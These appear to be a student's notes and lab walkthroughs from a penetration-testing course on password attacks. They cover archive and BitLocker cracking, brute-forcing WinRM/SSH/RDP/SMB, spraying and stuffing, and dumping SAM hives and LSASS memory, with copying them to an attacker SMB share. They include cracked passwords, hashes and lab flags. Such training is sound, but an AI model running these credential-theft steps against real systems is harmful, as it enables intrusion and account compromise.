Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 512/512 AVX-512 16x / SHA512 512/512 AVX-512 8x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
beethoven        (Confidential.xlsx)     
1g 0:00:00:22 DONE (2026-07-01 12:44) 0.04531g/s 307.4p/s 307.4c/s 307.4C/s 111111111111111..polly
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

beethoven

# Cracking Protected Archives



## Common Archive Types

```bash
# Query all compressed file extensions from FileInfo
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

Common formats encountered: `tar`, `gz`, `rar`, `zip`, `7z`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `gzip`

> ⚠️ Not all archive types natively support password protection — TAR files for example are commonly encrypted externally via `openssl` or `gpg`.



## Cracking ZIP files

```bash
# Extract hash
~/john/run/zip2john ZIP.zip > zip.hash
cat zip.hash

# Crack
john --wordlist=rockyou.txt zip.hash

# Show result
john zip.hash --show
# ZIP.zip/customers.csv:1234
```



## Cracking OpenSSL-Encrypted GZIP Files

First check the actual file type - the extension may be misleading:

```bash
file GZIP.gzip
# GZIP.gzip: openssl enc'd data with salted password
```

JtR/hashcat don't handle OpenSSL encrypted files well (too many false positives). Use a `for` loop with `openssl` directly instead:

```bash
for i in $(cat rockyou.txt); do
    openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
```

Ignore the GZIP error spam - if the correct password is hit, a file will be extracted. Check after:

```bash
ls
# customers.csv  GZIP.gzip  rockyou.txt
```



## Cracking BitLocker-Encrypted Drives

BitLocker uses AES-128 or AES-256. `bitlocker2john` extracts 4 hashes - focus on the first (`$bitlocker$0$...`) which corresponds to the password (not the 48-digit recovery key).

```bash
# Extract hashes
bitlocker2john -i Backup.vhd > backup.hashes

# Isolate the password hash
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash

# Crack with hashcat (mode 22100)
hashcat -a 0 -m 22100 '$bitlocker$0$16$...' /usr/share/wordlists/rockyou.txt
```

> ⚠️ BitLocker cracking is **very slow** (~25 H/s) due to AES — expect minutes even for simple passwords.



## Mounting BitLocker Drives on Linux

```bash
# Install dislocker
sudo apt-get install dislocker

# Create mount points
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount

# Mount the VHD as a loop device
sudo losetup -f -P Backup.vhd

# Decrypt with dislocker
sudo dislocker /dev/loop0p2 -u<password> -- /media/bitlocker

# Mount decrypted volume
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

# Browse files
cd /media/bitlockermount && ls -la

# Unmount when done
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```



## Workflow Summary

```bash
Identify archive type (file command if unsure)
        ↓
Extract hash with appropriate *2john tool
        ↓
Crack with john/hashcat + rockyou.txt
        ↓
For OpenSSL GZIP → use openssl for loop instead
For BitLocker → hashcat -m 22100, then mount with dislocker
```



## Key Takeaways

- Always run `file <archive>` first - extension != actual format
- ZIP -> zip2john -> john
- OpenSSL GZIP -> skip john/hashcat, use openssl for loop directly
- BitLocker -> `bitlocker2john` -> `grep bitlocker\$0` -> `hashcat -m 22100`
- Recovery key cracking is impractical - always target the password hash
- After cracking BitLocker on Linux, `dislocker` is required to mount - it's not natively supported



## Connect to HTB



#### Run the above target then navigate to [http://ip:port/download](http://ip:port/download), then extract the downloaded file. Inside, you will find a password-protected VHD file. Crack the password for the VHD and submit the recovered password as your answer.

```bash
./bitlocker2john -i ../../Desktop/Private.vhd > private.hash
grep "bitlocker\$0" private.hash > private2.hash
cat private2.hash

$bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$1048576$12$b020fe18bbb1db0103000000$60$e9c6b548788aeff190e517b0d85ada5daad7a0a3f40c4467307011ac17f79f8c99768419903025fd7072ee78b15a729afcf54b8c2e3af05bb18d4ba0

hashcat -a 0 -m 22100 private2.hash /usr/share/wordlists/rockyou.txt

$bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$1048576$12$b020fe18bbb1db0103000000$60$e9c6b548788aeff190e517b0d85ada5daad7a0a3f40c4467307011ac17f79f8c99768419903025fd7072ee78b15a729afcf54b8c2e3af05bb18d4ba0:francisco
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$b3c105c7ab7faaf544e84d712810da65$10...8d4ba0
Time.Started.....: Wed Jul  1 12:57:52 2026 (12 secs)
Time.Estimated...: Wed Jul  1 12:58:04 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       45 H/s (10.38ms) @ Accel:128 Loops:4096 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/14344384 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 384/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
Candidate.Engine.: Device Generator
Candidates.#1....: jeffrey -> letmein
Hardware.Mon.#1..: Temp: 43c Util: 78%

Started: Wed Jul  1 12:56:40 2026
Stopped: Wed Jul  1 12:58:06 2026

sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
sudo losetup -f -P Desktop/Private.vhd

sudo losetup -l # Search for Private.vhd

sudo dislocker /dev/loop26p1 -ufrancisco -- /media/bitlocker

sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

cd /media/bitlockermount && ls -la
cd /media/bitlockermount
43d95aeed3114a53ac66f01265f9b7af

sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```



# Network Services



## Overview

Common network services encountered in pentests:

- FTP 
- SMB
- NFS
- IMAP/POP3
- SSH
- MySQL/MSSQL
- RDP
- WinRM
- VNC
- Telnet
- SMTP
- LDAP

All use username/password authentication and are often left with default or weak credentials.

### WinRM

Windows Remote Management - Microsoft's remote management protocol based on SOAP/XML. Runs on:

- TCP 5985 (HTTP)
- TCP 5986 (HTTPS)

Must be manually enabled on Windows 10/11.

#### Brute-forcing with NetExec

```bash
# Install
git clone https://github.com/Pennyw0rth/NetExec
cd NetExec
source ../venv/bin/activate
pip install netexec --no-deps
pip install impacket msldap minikerberos winsspi
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
netexec --version
pip install -e .
netexec --version

# General syntax
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

# Attack WinRM
netexec winrm 10.129.42.197 -u user.list -p password.list
# [+] None\user:password (Pwn3d!) → means RCE is possible
```



#### Connect with Evil-WinRM

```bash
# Install
sudo apt install ruby-dev -y
sudo gem install evil-winrm

# Connect
evil-winrm -i 10.129.42.197 -u user -p password
# Opens PowerShell session via MS-PSRP
```



### SSH

Default port: TCP 22. Uses three cryptographic methods:


| Method         | Description                                                                                         |
| -------------- | --------------------------------------------------------------------------------------------------- |
| **Symmetric**  | Same key for encrypt/decrypt; uses Diffie-Hellman for key exchange (AES, Blowfish, 3DES)            |
| **Asymmetric** | Public key encrypts, private key decrypts; private key compromise = full access without credentials |
| **Hashing**    | Confirms message authenticity — one-way function                                                    |




#### Brute-forcing with Hydra

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
# Recommended: -t 4 (many SSH servers limit parallel connections)
```



#### Connect

```bash
ssh user@10.129.42.197
```



### RDP

Microsoft's Remote Desktop Protocol. Default port: TCP 3389. Transmits image, sound, keyboard, mouse, printer, and storage media between terminal client and server.

#### Bryte-forcing with Hydra

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
# Recommended: -t 4 -W 3 (RDP doesn't handle parallel connections well)
```

> Hydra may return `account not active for remote desktop` - account exists but RDP access is disabled for that user specifically.



#### Connect from Linux

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```



### SMB

Server Message Block - file/directory sharing and printing in Windows networks. Also known as CIFS. Open-source implementation: Samba. Default port: TCP 445.

#### Brute-forcing with Hydra

```bash
hydra -L user.list -P password.list smb://10.129.42.197
# SMB forces -t 1 (no parallel connections)
```

> If Hydra returns `invalid reply` -> outdated version can't handle SMBv3. Use Metasploit instead.



#### Brute-forcing with Metasploit (SMBv3 fallback)

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
# [+] Success: '.\user:password'
```



#### Enumerate with NetExec

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
# Shows share names + READ/WRITE permissions
```



#### Connect to a share

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
# Then use ls, get, put commands inside the smb shell
```



## Tool Summary


| Service | Brute-force tool          | Connect tool                     |
| ------- | ------------------------- | -------------------------------- |
| WinRM   | `netexec winrm`           | `evil-winrm`                     |
| SSH     | `hydra`                   | `ssh`                            |
| RDP     | `hydra`                   | `xfreerdp`                       |
| SMB     | `hydra` / `msf smb_login` | `smbclient` / `netexec --shares` |




## Key Takeaways

- NetExec is the Swiss army knife here - supports WinRM, SMB, RDP, SSH, LDAP, MSSQL, FTP, NFS, VNC in one tool
- `(Pwn3d!)` in NetExec output = code execution possible, not just authentication
- **Hydra + SMB** often fails on modern targets due to SMBv3 — always have Metasploit as fallback
- RDP brute-force should use `-t 4 -W 3` to avoid triggering lockouts or connection refusals
- SSH brute-force should use `-t 4` for the same reason
- Always enumerate SMB shares after getting credentials — READ/WRITE permissions determine what you can do next



## Connect to HTB



#### Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
unzip connect.zip
cd netexec
nxc winrm 10.129.49.145 -u ../Desktop/connect/username.list -p ../Desktop/connect/password.list --ignore-pw-decoding

# Through metasploit we encounter 4 accounts, and this is the only one it has not accessed 
evil-winrm -i 10.129.49.145 -u dennis -p rockstar
evil-winrm -i 10.129.49.145 -u john -p november
cd ../Desktop
dir
more flag.txt
HTB{That5Novemb3r}
```



#### Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
hydra -L Desktop/connect/username.list -P Desktop/connect/password.list ssh://10.129.49.145 -t 4

[22][ssh] host: 10.129.49.145   login: dennis   password: rockstar
[STATUS] 61.43 tries/min, 430 tries in 00:07h, 20682 to do in 05:37h, 4 active

ssh dennis@10.129.49.145
cd Desktop
more flag.txt
HTB{Let5R0ck1t}
```



#### Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
hydra -L Desktop/connect/username.list -P Desktop/connect/password.list rdp://10.129.49.145 -t 4

account on 10.129.49.145 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.

[3389][rdp] host: 10.129.49.145   login: chris   password: 789456123

xfreerdp /v:10.129.49.145 /u:chris /p:'789456123'
HTB{R3m0t3DeskIsw4yT00easy}
```



#### Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
hydra -L Desktop/connect/username.list -P Desktop/connect/password.list smb://10.129.49.145
```

So we gotta do it with Metasploit:

```bash
cd Desktop/connect/
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file username.list
set pass_file password.list
set rhosts 10.129.49.145
run

[+] 10.129.49.145:445     - 10.129.49.145:445     - Success: '.\john:november'
[+] 10.129.49.145:445     - 10.129.49.145:445     - Success: '.\dennis:rockstar'
[+] 10.129.49.145:445     - 10.129.49.145:445     - Success: '.\chris:789456123'
[+] 10.129.49.145:445     - 10.129.49.145:445     - Success: '.\cassie:12345678910'

nxc smb 10.129.49.145 -u john -p november --shares

SMB         10.129.49.145   445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.49.145   445    WINSRV           [+] WINSRV\john:november 
SMB         10.129.49.145   445    WINSRV           [*] Enumerated shares
SMB         10.129.49.145   445    WINSRV           Share           Permissions            Remark
SMB         10.129.49.145   445    WINSRV           -----           -----------            ------
SMB         10.129.49.145   445    WINSRV           ADMIN$                                 Remote Admin
SMB         10.129.49.145   445    WINSRV           C$                                     Default share
SMB         10.129.49.145   445    WINSRV           CASSIE                                 
SMB         10.129.49.145   445    WINSRV           IPC$            READ                   Remote IPC

smbclient -U john '//10.129.49.145/ADMIN$'
Password for [WORKGROUP\john]:
tree connect failed: NT_STATUS_ACCESS_DENIED

smbclient -U john '//10.129.49.145/CASSIE'
Password for [WORKGROUP\john]:
Try "help" to get a list of possible commands.
NT_STATUS_ACCESS_DENIED listing \*

smbclient -U cassie '//10.129.49.145/CASSIE'
HTB{S4ndM4ndB33}
```



# Spraying, Stuffing, and Defaults



## Password Spraying

One password -> many users. Effective when default/standard passwords are in use (e.g. IT sets `ChangeMe123!` for new accounts).

```bash
# Spray one password across many users on a subnet
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
```

> Unlike traditional brute-force, spraying avoids account lockouts by trying only one password per user.



## Credential Stuffing

Leaked `username:password` pairs from one service -> tried against another. Exploits the 66% password reuse rate.

```bash
# -C flag accepts user:pass pairs directly (one per line)
hydra -C user_pass.list ssh://10.100.38.23
```

Format of `user_pass.list`:

```bash
john:password123
admin:letmein
user:qwerty
```



## Default Credentials

Many devices ship with hardcoded credentials that admins forget to change. Use the Default Credentials Cheat Sheet tool:

```bash
# Install
pip3 install defaultcreds-cheat-sheet

# Search by product/vendor
creds search linksys
```

Common router defaults (high-value targets in internal networks):


| Brand   | Default IP  | Username | Password |
| ------- | ----------- | -------- | -------- |
| D-Link  | 192.168.0.1 | admin    | Admin    |
| Netgear | 192.168.0.1 | admin    | password |
| Linksys | 192.168.1.1 | admin    | Admin    |
| Belkin  | 192.168.2.1 | admin    | admin    |




## Key Takeaways

- **Spraying** → one password, many users → avoids lockouts, great for AD environments
- **Stuffing** → leaked pairs → exploit reuse → use `-C` in Hydra
- **Default creds** → always check before brute-forcing — saves enormous time
- Check product documentation for defaults when `creds search` doesn't return results
- Internal/test routers are frequently overlooked and left with factory defaults



## Connect to HTB



#### Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: :)

```bash
On the link of the page, we can try the credentials:
```



# Windows Authentication Process



## Overview

Windows authentication involves multiple coordinated components. The Local Security Authority (LSA) is the core protected subsystem responsible for authenticating users, managing security policies, and translating usernames to Security Identifiers (SIDs).

## Key Components


| Component                | Role                                                                                                                                                   |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **WinLogon.exe**         | Trusted process that manages security interactions (login, lock, password change). Only process that intercepts keyboard login requests via Win32k.sys |
| **LogonUI**              | Graphical interface launched by WinLogon to collect credentials                                                                                        |
| **Credential Providers** | COM objects (DLLs) that collect user credentials and pass them to WinLogon                                                                             |
| **LSASS**                | Core authentication engine — enforces security policy, authenticates users, forwards audit logs                                                        |




## LSASS Authentication Packages


| DLL            | Description                                                      |
| -------------- | ---------------------------------------------------------------- |
| `Lsasrv.dll`   | LSA server — selects between NTLM and Kerberos                   |
| `Msv1_0.dll`   | Handles local (non-domain) interactive logons                    |
| `Samsrv.dll`   | Manages SAM database and local security policies                 |
| `Kerberos.dll` | Handles Kerberos-based authentication                            |
| `Netlogon.dll` | Handles network-based logons                                     |
| `Ntdsa.dll`    | Manages Active Directory (ntds.dit) — only on Domain Controllers |




## Credential Storage Locations



### SAM Database

- Stores local user account hashes (LM or NTLM format)
- Location: `%SystemRoot\system32\config\SAM` -> mounted at `HKLM\SAM`
- Requires SYSTEM privileges to access
- Protected by SYSKEY (introduced in Windows NT 4.0) - partially encrypts SAM on disk


| Scenario              | Authentication against                           |
| --------------------- | ------------------------------------------------ |
| Workgroup machine     | Local SAM database                               |
| Domain-joined machine | Active Directory (ntds.dit) on Domain Controller |




### Credential Manager

- Stores credentials for network resources, websites, apps
- Encrypted, stored per user profile at

```bash
C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```



## NTDS.dit

- Active Directory database on Domain Controllers
- Contains: user accounts + password hashes, group accounts, computer accounts, GPOs
- Synchronized across all DCs (except RODCs)
- Location: `%SystemRoot%\ntds.dit`



## Key Takeaways

- LSASS is the primary target for credential extraction on Windows - it holds authentication data in memory
- SAM -> local acounts only; needs SYSTEM access; protected by SYSKEY
- NTDS.dit -> domain-wide credential goldmine; extracting it gives hashes for every domain user
- Credential Manager -> often overlooked but can contain saved network/web credentials
- The flow is: WinLogon -> LogonUI -> Credential Provider -> LSASS -> SAM or AD



# Attacking SAM, SYSTEM, and SECURITY



## Target Registry Hives

Three hives needed for credential extraction (requires local admin):


| Hive            | Contains                                                  |
| --------------- | --------------------------------------------------------- |
| `HKLM\SAM`      | Local user password hashes (LM/NT)                        |
| `HKLM\SYSTEM`   | Boot key — required to decrypt SAM                        |
| `HKLM\SECURITY` | LSA secrets, cached domain credentials (DCC2), DPAPI keys |


```bash
locate secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```



### Step 1 - Save Registry Hives (on target, cmd as admin)

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```



### Step 2 - Transfer to Attack Host

```bash
# On attack host — create SMB share
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

```cmd
# On target — move files to share
move sam.save \\<attacker-IP>\CompData
move security.save \\<attacker-IP>\CompData
move system.save \\<attacker-IP>\CompData
```



### Step 3 - Dump Hashes with secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -sam sam.save -security security.save -system system.save LOCAL
```

Output format:

```bash
username:RID:lmhash:nthash:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

> `aad3b435b51404eeaad3b435b51404ee` = empty LM hash (standard on modern Windows). Focus on the NT hash (last field).



### Step 4 - Crack NT Hashes with Hashcat

```bash
# Extract NT hashes into a file
vim hashestocrack.txt

# Crack (mode 1000 = NTLM/NT)
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```



## DCC2 Hashes (Cached Domain Credentials)

Dumped from `HKLM\SECURITY`. Format:

```bash
domain/username:$DCC2$10240#username#<hash>
```

```bash
# Crack DCC2 (mode 2100)
hashcat -m 2100 '$DCC2$10240#administrator#<hash>' /usr/share/wordlists/rockyou.txt
```

> DCC2 is ~800x slower than NT hashes (PBKDF2). Cannot be used for Pass-the-Hash.



## DPAPI (Data Protection API)

Also dumped from `HKLM\SECURITY`. Decrypts credentials stored by:


| Application        | Stored data                         |
| ------------------ | ----------------------------------- |
| Chrome / IE        | Saved website passwords             |
| Outlook            | Email account passwords             |
| RDP                | Saved remote connection credentials |
| Credential Manager | Network shares, VPN, WiFi passwords |


```cmd
# Decrypt Chrome passwords with mimikatz
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```



## Remote Dumping (no RDP needed - just admin creds)

```bash
# Dump LSA secrets remotely
nxc smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

# Dump SAM remotely
nxc smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```



## Full Attack Workflow

```bash
Admin access to Windows target
        ↓
reg.exe save → sam/system/security hives
        ↓
smbserver.py → transfer hives to attack host
        ↓
secretsdump.py → extract NT hashes + DCC2 + DPAPI keys
        ↓
hashcat -m 1000 → crack NT hashes
hashcat -m 2100 → crack DCC2 (slow)
mimikatz/dpapi → decrypt DPAPI blobs
        ↓
Reuse cracked credentials for lateral movement
```



## Key Takeaways

- Always grab all three hives - `SECURITY` is often overlooked but contains DPAPI keys and cached comain creds
- NT hash = the crackable one on modern Windows; LM hash is empty (`aaad3b435...`) on Vista+
- DCC2 = cached domain creds, very slow to crack, can't be used for PtH
- DPAPI = often contains cleartext credentials from browser and apps - high value target
- `nxc --sam` and `nxc --lsa` allow remote dumping without touching the filesystem directly - stealthier



## Connect to HTB



#### Where is the SAM database located in the Windows registry? (Format: ******)

```bash
hklm\sam
```



#### Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

```cmd
# Run CMD as Administrator
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```bash
sudo $(which smbserver.py) -smb2support CompData /home/mapacheroja22/Documents/
```

```cmd
move C:\sam.save \\10.10.17.216\CompData
move C:\system.save \\10.10.17.216\CompData
move C:\security.save \\10.10.17.216\CompData
```

```bash
cd ~/Documents
sudo $(which secretsdump.py) -sam ~/Documents/sam.save -security ~/Documents/security.save -system ~/Documents/system.save LOCAL
```

```bash
nano hashestocrack.txt
31d6cfe0d16ae931b73c59d7e0c089c0
72639bbb94990305b5a015220f8de34e
3c0e5d303ec84884ad5c3b7876a06ea6
a3ecf31e65208382e23b3420a34208fc
c02478537b9727d391bc80011c2e2321
58a478135a93ac3bf058a5ea0e8fdb71

hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

```
# Crack (mode 1000 = NTLM/NT)
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

```bash
matrix
```



#### Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```bash
source ~/venv/bin/activate
nxc smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [*] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 2 LSA secrets to /home/mapacheroja22/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-07-01_162439.secrets and /home/mapacheroja22/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-07-01_162439.cached
```



# Attacking LSASS



## Why LSASS?

LSASS holds in memory (for active sessions): cached credentials, access tokens, Kerberos tickets, DPAPI masterkeys. Dumping it  snapshot of all active credentials at that moment.

### Method 1 - Task Manager (GUI)

Requires interactive RDP session:

1. Open Task Manager -> Processes tab
2. Find Local Security Authority Process
3. Right-click -> Create dump file
4. File saved as `lsass.DMP` in `%temp%`



### Method 2 - rundll32 + comsvcs.dll (CLI)

No GUI needed. First find LSASS PID:

```cmd
# CMD
tasklist /svc
# Look for lsass.exe → note PID
```

```powershell
# PowerShell
Get-Process lsass
# Note the Id field
```

Then create the dump (elevated PowerShell):

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

> Modern AV detects this as malicious - may need AV bypass first

Transfer dump to attack host the same way as SAM hives (smbserver.py)

### Extracting Credentials with Pypykatz

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

Output sections and what they contain:


| Section      | Contents                  | Notes                                                                          |
| ------------ | ------------------------- | ------------------------------------------------------------------------------ |
| **MSV**      | NT hash, SHA1, LM, SID    | Primary target — always present                                                |
| **WDIGEST**  | Cleartext password        | Only on Windows XP→8 / Server 2003→2012; disabled by default on modern Windows |
| **Kerberos** | Tickets, passwords, ekeys | Useful for lateral movement in AD environments                                 |
| **DPAPI**    | Masterkey + key GUID      | Used to decrypt browser/app credentials                                        |




## Cracking the NT Hash

```bash
# Extract NT hash from pypykatz output → put in file
echo "64f12cddaa88057e06a81b54e73b949b" > nt.hash

# Crack with hashcat (mode 1000 = NT/NTLM)
hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt
```



## Full Attack Workflow

```
RDP/shell access to Windows target
        ↓
Get LSASS PID (tasklist /svc or Get-Process lsass)
        ↓
rundll32 comsvcs.dll MiniDump → lsass.dmp
        ↓
Transfer to attack host (smbserver.py)
        ↓
pypykatz lsa minidump lsass.dmp
        ↓
Extract NT hashes → hashcat -m 1000
Extract DPAPI masterkeys → decrypt browser/app creds
Check WDIGEST → cleartext if old Windows
```



## Key Takeaways

- **Q1 answer**: `lsass.exe`
- LSASS dump = credentials for **all currently logged-in users** — high value target
- WDIGEST cleartext is rare on modern systems but always worth checking
- NT hashes from LSASS can be cracked **or** used directly for Pass-the-Hash (covered later)
- DPAPI masterkeys from LSASS unlock browser passwords, Outlook, RDP saved creds — don't ignore them
- Pypykatz runs on Linux — no need to run Mimikatz on the target itself



## Connect to HTB



#### What is the name of the executable file associated with the Local Security Authority Process?

```bash
lsass.exe
```



#### Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

```bash
xfreerdp /v:10.129.202.149 /u:htb-student /p:'HTB_@cademy_stdnt!'

C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP

tasklist /svc
lsass.exe                      660 KeyIso, SamSs     

source ~/venv/bin/activate
sudo $(which smbserver.py) -smb2support CompData /home/mapacheroja22/Documents/
```

```cmd
move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP \\10.10.17.216\CompData

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 660 C:\lsass.dmp full
```

```bash
source ~/venv/bin/activate
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

INFO:pypykatz:Parsing file /home/mapacheroja22/Documents/lsass.dmp
FILE: ======== /home/mapacheroja22/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 546312 (85608)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-07-01T20:36:05.238459+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 546312
	== MSV ==
		Username: htb-student
		Domain: FS01
		LM: NA
		NT: 3c0e5d303ec84884ad5c3b7876a06ea6
		SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [85608]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: htb-student
		Domain: FS01
	== WDIGEST [85608]==
		username htb-student
		domainname FS01
		password None
		password (hex)

== LogonSession ==
authentication_id 525394 (80452)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2026-07-01T20:36:04.332204+00:00
sid S-1-5-90-0-2
luid 525394
	== WDIGEST [80452]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [80452]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 524005 (7fee5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2026-07-01T20:36:04.316581+00:00
sid S-1-5-96-0-2
luid 524005
	== WDIGEST [7fee5]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [7fee5]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 520124 (7efbc)
session_id 0
username htb-student
domainname FS01
logon_server FS01
logon_time 2026-07-01T20:35:59.691592+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 520124

== LogonSession ==
authentication_id 73538 (11f42)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2026-07-01T20:26:34.832213+00:00
sid S-1-5-90-0-1
luid 73538
	== WDIGEST [11f42]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [11f42]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 43823 (ab2f)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2026-07-01T20:26:34.535331+00:00
sid S-1-5-96-0-1
luid 43823
	== WDIGEST [ab2f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [ab2f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 43807 (ab1f)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2026-07-01T20:26:34.535331+00:00
sid S-1-5-96-0-0
luid 43807
	== WDIGEST [ab1f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [ab1f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2026-07-01T20:26:34.113465+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== Kerberos ==
		Username: fs01$
		Domain: WORKGROUP
	== WDIGEST [3e7]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 7a4c5806-cde2-4e33-bb8e-a7988d928856
		masterkey 3036713f3ccfde362f57050b050289413347b9063264743b01c65e4143c6806512ece05c708b934afe48cd5b8cfe88de125d6208bbe048bd3fb83838adf2946e
